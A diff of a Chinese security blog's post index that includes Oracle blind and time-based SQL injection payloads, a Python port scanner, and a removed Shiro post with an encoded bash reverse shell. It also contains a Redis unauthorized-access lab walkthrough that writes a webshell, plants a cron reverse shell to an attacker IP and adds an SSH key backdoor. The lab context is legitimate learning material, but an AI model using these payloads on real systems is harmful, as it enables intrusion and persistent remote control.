-<td align="left"><code>and (instr((select (select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+<td align="left">判断列名</td>
+<td align="left"><code>and (instr((select (select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1) from dual),&#39;T&#39;))--</code></td>
 </tr>
 <tr>
 <td align="left">判断数据</td>
-<td align="left"><code>and (instr((select (select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1) from dual),&#39;T&#39;))=1--</code></td>
+<td align="left"><code>and (instr((select (select AGE from (select AGE,rownum as limit from (select * from 列名)) where limit=1) from dual),&#39;T&#39;))--</code></td>
 </tr>
 </tbody></table>
 <h1 id="四、延时盲注"><a href="#四、延时盲注" class="headerlink" title="四、延时盲注"></a>四、延时盲注</h1><p>相关函数</p>
@@ -3473,15 +3473,15 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">判断数据库名（用户名）</td>
-<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code> <br><br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),’T’,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
+<td align="left">判断用户名</td>
+<td align="left"><code>and(select decode(substr(user,1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code> <br>或 <br><code>and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),’T’,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
 </tr>
 <tr>
 <td align="left">判断表名</td>
 <td align="left"><code>and(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
 </tr>
 <tr>
-<td align="left">判断字段名</td>
+<td align="left">判断列名</td>
 <td align="left"><code>and(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--</code></td>
 </tr>
 <tr>
@@ -4580,7 +4580,7 @@
 <td align="left">删除admin所在行，删除限定符必须唯一</td>
 </tr>
 <tr>
-<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#49;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a>](mailto:<a href="mailto:&#49;&#x40;&#113;&#113;&#46;&#99;&#111;&#x6d;">&#49;&#x40;&#113;&#113;&#46;&#99;&#111;&#x6d;</a>)’ WHERE uname=’admin’; “);</td>
+<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#64;&#113;&#113;&#46;&#99;&#111;&#109;">&#49;&#64;&#113;&#113;&#46;&#99;&#111;&#109;</a>](mailto:<a href="mailto:&#49;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#49;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a>)’ WHERE uname=’admin’; “);</td>
 <td align="left">修改admin密码邮箱</td>
 </tr>
 <tr>
@@ -4696,35 +4696,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python之端口扫描</title>
-    <url>/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
-    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
-<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>
-
-<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>
-
-<p>守护进程</p>
-<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>
-
-<p>线程锁，防止多个线程同时操作一个资源对象</p>
-<pre class="highlight"><span class="line">lock = threading.Lock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>
-
-<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan(q):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, args=[q], daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
-
-<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Port/PortScan.py">https://www.zerochen.top/download/Port/PortScan.py</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>端口扫描</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python之爆破脚本</title>
     <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
@@ -4779,6 +4750,35 @@
       </tags>
   </entry>
   <entry>
+    <title>Python之端口扫描</title>
+    <url>/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
+<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>
+
+<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>
+
+<p>守护进程</p>
+<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>
+
+<p>线程锁，防止多个线程同时操作一个资源对象</p>
+<pre class="highlight"><span class="line">lock = threading.Lock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>
+
+<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan(q):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, args=[q], daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
+
+<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Port/PortScan.py">https://www.zerochen.top/download/Port/PortScan.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>端口扫描</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python之网络爬虫</title>
     <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
@@ -4802,25 +4802,116 @@
       </tags>
   </entry>
   <entry>
-    <title>Shiro反序列化漏洞复现</title>
-    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
-<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+    <title>Redis未授权访问漏洞复现</title>
+    <url>/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<h1 id="二、漏洞特征"><a href="#二、漏洞特征" class="headerlink" title="二、漏洞特征"></a>二、漏洞特征</h1><p>开放6379端口，可尝试免密登录</p>
+<p>漏洞版本：Redis 2.x，3.x，4.x，5.x</p>
+<pre class="highlight"><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">或</span><br><span class="line">redis-cli -h x.x.x.x -p 6379</span><br></pre>
 
-<p>b、使用xray检测，直接发送payload</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
+<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：Kali2020.1</p>
+<p>靶机：Ubuntu20 + Redis2.8.17</p>
+<p>1、下载环境</p>
+<pre class="highlight"><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre>
 
-<p>或指定脚本检测</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
+<p>2、解压并进入安装目录</p>
+<pre class="highlight"><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">make</span><br></pre>
 
-<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
+<p>报错：</p>
+<pre class="highlight"><span class="line">gcc: Command not found</span><br></pre>
+
+<p>解决：安装gcc</p>
+<pre class="highlight"><span class="line">apt install gcc</span><br></pre>
+
+<p>清理编译文件，重新编译</p>
+<pre class="highlight"><span class="line">make distclean  &amp;&amp; make</span><br></pre>
+
+<p>3、</p>
+<p>拷贝关键文件</p>
+<pre class="highlight"><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre>
+
+<p>4、启动</p>
+<pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>
+
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" alt="image-20210809162755821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" class="lozad post-image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" alt="image-20210809162803617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" class="lozad post-image"></p>
+<p>登陆成功</p>
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
+<p>因为没有搭建网站环境，这里写在用户根目录</p>
+<pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" alt="image-20210809162814551" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" class="lozad post-image"></p>
+<p>靶机成功写入</p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" alt="image-20210809162823433" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" class="lozad post-image"></p>
+<h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
+<pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" alt="image-20210809162930370" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" class="lozad post-image"></p>
+<p>注意！</p>
+<p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
+<pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>
+
+<p>2、Ubuntu下定时任务乱码则不执行，需手动删除乱码</p>
+<p>3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行</p>
+<pre class="highlight"><span class="line">chmod 600 root</span><br></pre>
+
+<p>解决以上坑点，成功反弹shell</p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" alt="image-20210809162939325" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" class="lozad post-image"></p>
+<p>但是这样意义不大，据说centos无以上坑点。</p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
+<pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>
+
+<p>2、设置redis变量</p>
+<pre class="highlight"><span class="line">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide		# 将公钥内容设置给redis变量（靶机ip）</span><br></pre>
+
+<p>3、连接redis并写入</p>
+<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>
+
+<p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" alt="image-20210809162954548" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" class="lozad post-image"></p>
+<p>5、攻击机进行ssh连接</p>
+<pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" alt="image-20210809163005569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" class="lozad post-image"></p>
+<p>连接成功</p>
+<p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
+<p>附Ubuntu安装ssh</p>
+<pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>
+
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
+<p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
+<pre class="highlight"><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre>
+
+<p>这里还有个内网redis利用姿势–gopher协议，一并懒过去。</p>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
+<p>准备：</p>
+<p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
